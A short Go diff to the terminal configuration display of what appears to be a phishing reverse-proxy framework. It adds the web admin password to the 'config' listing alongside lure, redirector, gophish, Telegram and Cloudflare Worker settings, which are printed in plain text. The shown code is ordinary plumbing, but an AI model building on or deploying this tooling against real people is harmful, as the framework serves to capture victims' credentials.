@@ -44,9 +44,10 @@ type Terminal struct {
 	db        *database.Database
 	hlp       *Help
 	developer bool
+	webApi    *WebAPI
 }
 
-func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
+func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool, webApi *WebAPI) (*Terminal, error) {
 	var err error
 	t := &Terminal{
 		cfg:       cfg,
@@ -54,6 +55,7 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 		p:         p,
 		db:        db,
 		developer: developer,
+		webApi:    webApi,
 	}
 
 	t.createHelp()
@@ -247,8 +249,15 @@ func (t *Terminal) handleConfig(args []string) error {
 			domainsSummary += " (use 'domains' command to manage)"
 		}
 		webAdminUrl := fmt.Sprintf("http://127.0.0.1:%d", t.cfg.GetWebAdminPort())
-		keys := []string{"domains", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "post_redirectors_dir", "lure_strategy", "web_admin_url", "gophish integrated_admin_url", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
-		vals := []string{domainsSummary, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, postRedirectorsDir, lureStrategy, webAdminUrl, t.cfg.GetGoPhishIntegratedAdminUrl(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		webAdminPass := ""
+		if t.webApi != nil {
+			webAdminPass = t.webApi.GetAdminPass()
+		}
+		if webAdminPass == "" {
+			webAdminPass = "(set at first run)"
+		}
+		keys := []string{"domains", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "post_redirectors_dir", "lure_strategy", "web_admin_url", "web_admin password", "gophish integrated_admin_url", /*"gophish admin_url",*/ /*"gophish api_key",*/ "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		vals := []string{domainsSummary, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, postRedirectorsDir, lureStrategy, webAdminUrl, webAdminPass, t.cfg.GetGoPhishIntegratedAdminUrl(), /*t.cfg.GetGoPhishAdminUrl(),*/ /*t.cfg.GetGoPhishApiKey(),*/ gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
